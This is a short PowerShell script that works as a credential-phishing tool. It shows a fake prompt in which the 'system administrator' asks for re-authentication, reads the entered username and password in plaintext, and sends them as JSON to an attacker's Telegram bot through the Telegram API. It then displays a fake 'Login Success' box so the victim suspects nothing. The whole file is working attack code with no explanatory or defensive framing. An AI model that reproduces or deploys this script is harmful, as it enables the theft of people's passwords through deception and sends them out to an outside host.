$bot_token = ""
$message_FromID = ""

$credential = Get-Credential -Message "Your system administrator is requesting you re-authenticate to the server."
$data = @{
    Username = $credential.GetNetworkCredential().Username
    Password = $credential.GetNetworkCredential().Password
}
$json_msg = $data | ConvertTo-Json 
$uri = 'https://api.telegram.org/bot' + $bot_token + '/sendMessage?chat_id=' + $message_FromID + '&parse_mode=HTML&text=' + $json_msg
Invoke-WebRequest -uri  $uri -UseBasicParsing | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
[System.Windows.Forms.MessageBox]::Show('Your account was succesfully autenticated.','Login Success')
